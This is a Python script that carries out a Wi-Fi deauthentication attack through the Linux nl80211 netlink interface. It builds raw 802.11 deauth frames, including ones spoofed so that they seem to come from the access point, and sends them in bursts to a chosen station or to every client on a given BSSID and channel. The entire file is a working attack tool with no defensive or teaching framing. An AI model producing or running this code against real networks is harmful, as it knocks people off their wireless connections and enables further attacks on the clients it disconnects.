#!/usr/bin/env python3
"""
Deauth injection via nl80211 CMD_FRAME - fire & forget.
Sends primer frame first, then deauth bursts without waiting for ACK.
"""
import socket, struct, fcntl, sys, time

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

def get_nl80211_family_id():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16+len(genlhdr)+len(attr), 16, NLM_F_REQUEST|NLM_F_ACK, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off+4)[0]
            s.close()
            return fid
        off += (alen+3) & ~3
    s.close()
    return None

def get_ifindex(ifname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(sock.fileno(), 0x8933, struct.pack('256s', ifname.encode()))
    sock.close()
    return struct.unpack('i', result[16:20])[0]

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen+3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0'*(padded-alen)

def build_nl_frame(fid, ifidx, freq, frame, seq):
    attrs = nla(3, struct.pack('I', ifidx))
    attrs += nla(38, struct.pack('I', freq))
    attrs += nla(51, frame)
    attrs += struct.pack('HH', 4, 118)  # DONT_WAIT_FOR_ACK
    genlhdr = struct.pack('BBH', 59, 1, 0)
    payload = genlhdr + attrs
    nlhdr = struct.pack('IHHII', 16+len(payload), fid, NLM_F_REQUEST|NLM_F_ACK, seq, 0)
    return nlhdr + payload

def send_checked(sock, msg):
    """Send and read ONE response."""
    sock.send(msg)
    resp = sock.recv(4096)
    nltype = struct.unpack_from('H', resp, 4)[0]
    if nltype == 2:
        return struct.unpack_from('i', resp, 16)[0]
    return 0

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <iface> <bssid> [freq] [target] [count] [interval]")
        sys.exit(1)

    iface = sys.argv[1]
    bssid = bytes.fromhex(sys.argv[2].replace(':', ''))
    freq = int(sys.argv[3]) if len(sys.argv) > 3 else 2412
    target = bytes.fromhex(sys.argv[4].replace(':', '')) if len(sys.argv) > 4 else b'\xff\xff\xff\xff\xff\xff'
    count = int(sys.argv[5]) if len(sys.argv) > 5 else 100
    interval = float(sys.argv[6]) if len(sys.argv) > 6 else 0.1

    fid = get_nl80211_family_id()
    ifidx = get_ifindex(iface)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(sock.fileno(), 0x8927, struct.pack('256s', iface.encode()))
    our_mac = info[18:24]
    sock.close()

    print(f"[*] {iface} idx={ifidx} fid={fid} mac={our_mac.hex(':')}")
    print(f"[*] AP: {bssid.hex(':')} freq={freq} target: {target.hex(':')}")

    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    s.settimeout(2)

    # Each iteration: primer (SA=own) + spoofed (SA=AP)
    # Use separate netlink socket for each pair to avoid response confusion
    print(f"[*] Sending {count} deauth frames (primer + spoofed pairs)...")

    ok = fail = 0
    seq = 10

    for i in range(count):
        # Primer: deauth with our real SA
        p_frame = struct.pack('<HH', 0x00c0, 0)
        p_frame += b'\xff\xff\xff\xff\xff\xff' + our_mac + bssid
        p_frame += struct.pack('<HH', ((seq) & 0xfff) << 4, 7)
        p_msg = build_nl_frame(fid, ifidx, freq, p_frame, seq)
        seq += 1

        # Spoofed: deauth from AP
        d_frame = struct.pack('<HH', 0x00c0, 0)
        d_frame += target + bssid + bssid
        d_frame += struct.pack('<HH', ((seq) & 0xfff) << 4, 7)
        d_msg = build_nl_frame(fid, ifidx, freq, d_frame, seq)
        seq += 1

        # Send primer, wait for response
        s.send(p_msg)
        try:
            resp = s.recv(4096)
        except socket.timeout:
            pass

        # Send spoofed, wait for response
        s.send(d_msg)
        try:
            resp = s.recv(4096)
            nltype = struct.unpack_from('H', resp, 4)[0]
            if nltype == 2:
                errno = struct.unpack_from('i', resp, 16)[0]
                if errno == 0:
                    ok += 1
                else:
                    # Might have received primer's ACK, try reading one more
                    try:
                        resp2 = s.recv(4096)
                        nltype2 = struct.unpack_from('H', resp2, 4)[0]
                        if nltype2 == 2:
                            errno2 = struct.unpack_from('i', resp2, 16)[0]
                            if errno2 == 0:
                                ok += 1
                            else:
                                fail += 1
                                if fail <= 3: print(f"  frame {i}: errno={errno2}")
                        else:
                            ok += 1
                    except socket.timeout:
                        fail += 1
                        if fail <= 3: print(f"  frame {i}: errno={errno}")
            else:
                ok += 1  # nl80211 response = success
        except socket.timeout:
            fail += 1

        if (i+1) % 25 == 0:
            print(f"  [{i+1}/{count}] ok={ok} fail={fail}")
        time.sleep(interval)

    s.close()
    print(f"[*] Done: {ok} ok, {fail} fail")

if __name__ == '__main__':
    main()
